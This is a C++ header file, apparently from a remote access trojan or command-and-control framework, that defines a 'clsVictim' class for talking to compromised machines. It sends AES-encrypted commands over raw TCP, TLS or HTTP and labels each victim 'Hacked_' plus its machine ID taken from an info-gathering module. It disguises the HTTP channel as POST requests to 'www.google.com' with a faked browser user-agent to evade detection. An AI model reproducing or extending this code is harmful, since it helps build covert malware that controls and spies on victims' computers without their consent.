#pragma once

#include <arpa/inet.h>
#include <unistd.h>
#include <iostream>
#include <ostream>
#include <string>
#include <vector>
#include <atomic>

#include <openssl/ssl.h>
#include <openssl/err.h>

#include "clsEDP.hpp"
#include "clsTools.hpp"
#include "clsEZData.hpp"
#include "clsCrypto.hpp"
#include "clsInfoSpyder.hpp"

#include "clsHttpPkt.hpp"
#include "clsDnsPkt.hpp"

class clsVictim
{
public:
    std::string m_szVictimID = "";

public:
    enum enMethod
    {
        TCP,
        TLS,
        DNS,
        HTTP,
    };
    
public:
    enMethod m_method;

    int m_nSkt = -1;
    SSL* m_ssl = nullptr;

    std::unique_ptr<clsCrypto> m_crypto;
    clsHttpPkt m_httpPkt;

    std::atomic<bool> m_bClosed { false };

public:
    clsVictim()
    {

    }

    clsVictim(const clsVictim&) = delete;
    clsVictim& operator=(const clsVictim&) = delete;

    clsVictim(clsVictim&&) = delete;
    clsVictim& operator=(clsVictim&&) = delete;

    clsVictim(enMethod method, int nSkt)
    {
        m_method = method;
        m_nSkt = nSkt;
    }
    clsVictim(enMethod method, int nSkt, SSL* ssl)
    {
        m_method = method;
        m_nSkt = nSkt;
        m_ssl = ssl;
    }
    clsVictim(enMethod method, int nSkt, clsHttpPkt http)
    {
        m_method = method;
        m_nSkt = nSkt;
        m_httpPkt = http;
    }

    ~clsVictim()
    {
        fnSafeClose();
    }

    void fnSafeClose()
    {
        bool bExpected = false;
        if (!m_bClosed.compare_exchange_strong(bExpected, true))
        {
            return;
        }

        if (m_ssl)
        {
            SSL_shutdown(m_ssl);
            SSL_free(m_ssl);
            m_ssl = nullptr;
        }

        if (m_nSkt >= 0)
        {
            ::shutdown(m_nSkt, SHUT_RDWR);
            ::close(m_nSkt);
            m_nSkt = -1;
        }

        return;
    }

    ssize_t fnSendRAW(const std::string& szMsg)
    {
        std::vector<unsigned char> vuMsg(szMsg.begin(), szMsg.end());
        return fnSendRAW(vuMsg);
    }
    ssize_t fnSendRAW(const std::vector<unsigned char>& vuBuffer)
    {
        if (m_nSkt < 0) {
            std::cerr << "fnSendRAW: socket not initialized\n";
            return -1;
        }

        size_t total = vuBuffer.size();
        size_t sent = 0;

        while (sent < total) {
            ssize_t n = ::send(m_nSkt, vuBuffer.data() + sent, total - sent, 0);
            if (n < 0) {
                // Interrupted by signal — try again
                if (errno == EINTR) continue;
                std::cerr << "send() failed: " << std::strerror(errno) << "\n";
                return -1;
            }
            if (n == 0) {
                // peer closed connection
                std::cerr << "send() returned 0, peer closed\n";
                return static_cast<ssize_t>(sent);
            }
            sent += static_cast<size_t>(n);
        }
        
        return static_cast<ssize_t>(sent);
    }

    ssize_t fnSend(uint8_t nCommand, uint8_t nParam, const std::vector<unsigned char>& vuBuffer)
    {
        clsEDP edp(nCommand, nParam, vuBuffer);
        std::vector<unsigned char> vuData = edp.fnabGetBytes();

        if (m_method == enMethod::TCP)
        {
            return fnSendRAW(vuData);
        }
        else if (m_method == enMethod::HTTP)
        {
            std::string szBody = clsEZData::fnb64EncodeUtf8(vuData);
            BUFFER abHttpPkt = m_httpPkt.fnGetPacket(
                clsHttpPkt::enMethod::POST,
                "/",
                "www.google.com",
                "text/plain",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
                szBody
            );

            return fnSendRAW(abHttpPkt);
        }

        return -1;
    }
    ssize_t fnSend(uint8_t nCommand, uint8_t nParam, const std::string& szMsg)
    {
        std::vector<unsigned char> vuBuffer(szMsg.begin(), szMsg.end());
        return fnSend(nCommand, nParam, vuBuffer);
    }

    ssize_t fnSendCommand(const std::vector<std::string>& vsMsg, bool bSendToSub = false)
    {
        clsInfoSpyder spyder;
        auto stInfo = spyder.m_info;
        m_szVictimID = "Hacked_" + stInfo.m_szMachineID;

        std::vector<std::string> vuSend;
        if (bSendToSub)
        {
            vuSend.reserve(vsMsg.size());
        }
        else
        {
            vuSend.reserve(vsMsg.size() + 1);
            vuSend.push_back(m_szVictimID);
        }

        vuSend.insert(vuSend.end(), vsMsg.begin(), vsMsg.end());

        std::string szMsg = clsEZData::fnszSendParser(vuSend);
        
        return fnSendCommand(szMsg);
    }
    ssize_t fnSendCommand(const std::string& szMsg)
    {
        if (m_method == enMethod::TCP)
        {
            std::vector<unsigned char> vuCipher = m_crypto->fnvuAESEncrypt(szMsg);
            return fnSend(2, 0, vuCipher);
        }
        else if (m_method == enMethod::TLS)
        {
            return fnSslSend(szMsg);
        }
        else if (m_method == enMethod::DNS)
        {
            
        }
        else if (m_method == enMethod::HTTP)
        {
            BUFFER abData = m_crypto->fnvuAESEncrypt(szMsg);
            clsEDP edp(2, 0, abData);
            BUFFER abBuffer = edp.fnabGetBytes();
            std::string szData = clsEZData::fnb64Encode(abBuffer);

            BUFFER abHttpPkt = m_httpPkt.fnGetPacket(
                clsHttpPkt::enMethod::POST,
                "/",
                "www.google.com",
                "text/plain",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
                szData
            );

            return fnSendRAW(abHttpPkt);
        }

        return -1;
    }

    ssize_t fnSendCmdParam(uint8_t nCommand, uint8_t nParam, uint nLength = 10)
    {
        std::string szFoo = clsEZData::fnszGenerateRandomStr(nLength);
        std::vector<unsigned char> vuBuffer(szFoo.begin(), szFoo.end());

        clsEDP edp(nCommand, nParam, vuBuffer);
        std::vector<unsigned char> vuData = edp.fnabGetBytes();

        if (m_method == enMethod::TCP)
        {
            return fnSendRAW(vuData);
        }
        else if (m_method == enMethod::HTTP)
        {
            std::string szBody(vuData.begin(), vuData.end());
            return fnSendCommand(szBody);
        }

        return -1;
    }

    ssize_t fnSslSend(const std::string& szMsg)
    {
        BUFFER abBuffer(szMsg.begin(), szMsg.end());
        clsEDP edp(0, 0, abBuffer);
        BUFFER abMsg = edp.fnabGetBytes();

        return fnSslSend(abMsg);
    }
    ssize_t fnSslSend(BUFFER& abBuffer)
    {
        return SSL_write(m_ssl, abBuffer.data(), abBuffer.size());
    }
};